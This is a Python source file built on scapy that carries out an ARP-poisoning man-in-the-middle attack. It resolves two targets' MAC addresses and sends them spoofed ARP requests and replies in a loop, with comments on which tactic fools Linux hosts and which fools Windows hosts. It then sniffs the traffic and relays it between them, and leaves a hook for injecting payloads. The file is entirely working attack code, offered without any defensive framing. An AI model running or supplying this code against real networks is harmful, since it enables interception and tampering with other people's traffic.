from scapy.all import *
from scapy.layers.l2 import ARP, Ether


class ARPPoison:

    def __init__(self, target1, target2):
        self.__target1 = target1
        self.__target2 = target2

    # Replaces MAC addresses and mirrors the traffic. Any payload for the mitm attack would go into this function.
    @classmethod
    def replace_and_send(self, packet, local_mac, target1, target2):
        if not packet.haslayer(Ether) or packet[Ether].dst != local_mac:
            return
        if packet[Ether].src == target1:
            packet[Ether].src = local_mac
            packet[Ether].dst = target2
            sendp(packet)
        elif packet[Ether].src == target2:
            packet[Ether].src = local_mac
            packet[Ether].dst = target1
            sendp(packet)
        return

    # Executes a mitm attack, acquiring a position at level 2 between target1 and target2 (MAC)
    def arp_poison_mitm(self):
        my_mac = Ether().src
        my_ip = get_if_addr(conf.iface)
        p = Ether(dst="ff:ff:ff:ff:ff:ff", src=my_mac) / ARP(op="who-has", hwsrc=my_mac, psrc=my_ip, pdst=self.__target1)
        ans = srp1(p)
        t1_mac = ans[ARP].hwsrc
        p[ARP].pdst = self.__target2
        ans = srp1(p)
        t2_mac = ans[ARP].hwsrc
        while (True):
            try:
                # This message affects linux machines that don't accept ARP responses without ARP requests but cache the emitter
                # of an appropriate ARP request
                p = Ether(dst="ff:ff:ff:ff:ff:ff", src=my_mac) / ARP(op="who-has", hwsrc=my_mac, psrc=self.__target2, pdst=self.__target1)
                sendp(p)
                p[ARP].pdst = self.__target2
                p[ARP].psrc = self.__target1
                sendp(p)
                # This message affects Windows machines that accept ARP responses without previous request (and older linux kernels)
                p = Ether(dst=t1_mac, src=my_mac) / ARP(op="is-at", hwsrc=my_mac, psrc=self.__target2, pdst=self.__target1)
                sendp(p)
                p[ARP].psrc = self.__target1
                p[ARP].pdst = self.__target2
                p[Ether].dst = t2_mac
                sendp(p)
                # sniff and mirror for 5 seconds
                sniff(timeout=5, lfilter=lambda p: p[Ether].dst == my_mac,
                      prn=lambda p: self.replace_and_send(p, my_mac, t1_mac, t2_mac))
            except KeyboardInterrupt:
                print("Interrupted")
